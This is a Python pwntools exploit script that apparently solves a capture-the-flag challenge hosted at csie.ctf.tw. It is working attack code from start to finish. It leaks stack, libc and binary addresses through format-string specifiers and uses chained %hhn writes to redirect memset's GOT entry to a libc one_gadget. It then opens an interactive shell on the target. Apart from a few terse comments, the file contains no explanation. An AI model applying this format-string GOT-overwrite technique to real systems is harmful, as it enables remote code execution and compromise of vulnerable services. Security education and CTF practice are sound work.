#! /usr/bin/env python

from pwn import *


io = remote("csie.ctf.tw", 10130)
#io = remote("localhost", 8888)

#raw_input('@')

fmt_leak_stack = '%6$p'
fmt_leak_libc = '%11$p'
fmt_leak_text = '%7$p'
MARK = 'AAAA'

io.sendafter(':)',fmt_leak_stack + MARK + fmt_leak_libc + MARK + fmt_leak_text + MARK)
leak_stack = int(io.recvuntil(MARK, True), 16)
leak_libc = int(io.recvuntil(MARK, True), 16)
leak_text = int(io.recvuntil(MARK, True), 16)

libc_index = 0x20740        # local version
libc_index = 0x21ab0        # server version
libc_base = leak_libc - libc_index

one_gadget = libc_base + 0x45216    # local version
one_gadget = libc_base + 0x4f2c5    # server version

memset_got = leak_text + 0x2004e2

print hex(one_gadget)
print hex(memset_got)

p2cursor = 6
cursor = 8

cursor_low = (leak_stack + 0x10)%0x100

# use p2cursor to control cursor to write address to memset@got 
# write $rsp+0x20, point to memset@got
memset_got_low = (memset_got%0x100)
memset_got_mid = (memset_got/0x100)%0x100
memset_got_high = (memset_got/0x10000)%0x100

fmt_memset_got_low = '%' + str(memset_got_low) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendline(fmt_memset_got_low)

fmt_mv_cursor = '%' + str(cursor_low+1) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_memset_got_mid = '%' + str(memset_got_mid) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_memset_got_mid)

fmt_mv_cursor = '%' + str(cursor_low+2) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_memset_got_high = '%' + str(memset_got_high) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_memset_got_high)

# write at $rsp+0x18, point to memset@got+0x1
memset_got_low = (memset_got%0x100) + 1

cursor_low = cursor_low - 0x8

fmt_mv_cursor = '%' + str(cursor_low) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_memset_got_low = '%' + str(memset_got_low) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_memset_got_low)

fmt_mv_cursor = '%' + str(cursor_low+1) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_memset_got_mid = '%' + str(memset_got_mid) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_memset_got_mid)

fmt_mv_cursor = '%' + str(cursor_low+2) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_memset_got_high = '%' + str(memset_got_high) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_memset_got_high)

# hijecting the got

onegadget_low = one_gadget%0x100          # 1 byte
onegadget_mid = (one_gadget/0x100)%0x10000  # 2 bytes
#raw_input('ready for the final fmt!')
fmt_overwrite_got = '%' + str(onegadget_low) + 'c' + '%10$hhn' + '%' + str(onegadget_mid - onegadget_low) + 'c' + '%9$hn' + MARK
io.sendafter( MARK, fmt_overwrite_got)

sleep(3)

io.recvuntil(MARK)


io.interactive()
